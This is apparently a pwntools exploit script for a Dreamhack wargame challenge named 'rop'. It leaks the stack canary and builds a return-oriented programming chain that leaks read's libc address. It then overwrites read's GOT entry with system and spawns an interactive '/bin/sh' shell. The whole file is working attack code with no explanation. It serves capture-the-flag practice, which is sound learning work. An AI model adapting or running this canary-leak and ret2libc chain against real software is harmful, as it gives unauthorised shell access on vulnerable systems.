from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h'] 

# --------------------- BINARY ACCESS ---------------------- 

# LOCAL
p = process('./rop')

# LOCAL DEBUGGING ONLY
#gdb.attach(p, 'b *(main+199)')
#pause()

# REMOTE
#p = remote('host3.dreamhack.games', 21848)

# -------------- BINARY INFORMATION GATHERING -------------- 

# COMMON
e = ELF('./rop')
rop = ROP(e)

# LOCAL
libc = e.libc

# REMOTE
#libc = ELF('./libc-2.27.so')

# ------------------ BINARY EXPLOITATION ------------------- 

LEAK_DUMMY = b'\x41' * 0x39
PAYLOAD_DUMMY = b'\x42' * 0x38

p.recvuntil(b'[1] Leak Canary\n')

print('[+] [1] Leak Canary')
p.sendafter(b'Buf: ', LEAK_DUMMY)
p.recvuntil(LEAK_DUMMY)

CANARY = b'\x00' + p.recvn(7)

print('[+] Canary Info : ' + hex(u64(CANARY)), end='\n\n')

READ_PLT = p64(e.plt['read'])
READ_GOT = p64(e.got['read'])
PUTS_PLT = p64(e.plt['puts'])
RET = p64((rop.find_gadget(['ret']))[0])
POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
POP_RSI_R15 = p64((rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0])


PAYLOAD = PAYLOAD_DUMMY + CANARY + b'\x90' * 0x8
PAYLOAD += POP_RDI + READ_GOT + PUTS_PLT

PAYLOAD += POP_RDI + p64(0) + POP_RSI_R15 + READ_GOT + p64(0) + READ_PLT

PAYLOAD += POP_RDI + p64(u64(READ_GOT) + 0x8) + READ_PLT

p.recvuntil(b'[2] Input ROP payload\n')
print('[+] [2] Input ROP payload')
p.sendafter(b'Buf: ', PAYLOAD)

READ = u64(p.recvn(6) + b'\x00' * 2)

print('[+] Address of READ : ' + hex(READ))

LIBC_BASE = READ - libc.symbols["read"]
SYSTEM = LIBC_BASE + libc.symbols["system"]

print('[+] LIBC_BASE : ' + hex(LIBC_BASE))
print('[+] SYSTEM : ' + hex(SYSTEM))


p.send(p64(SYSTEM) + b'/bin/sh\x00')

p.interactive()

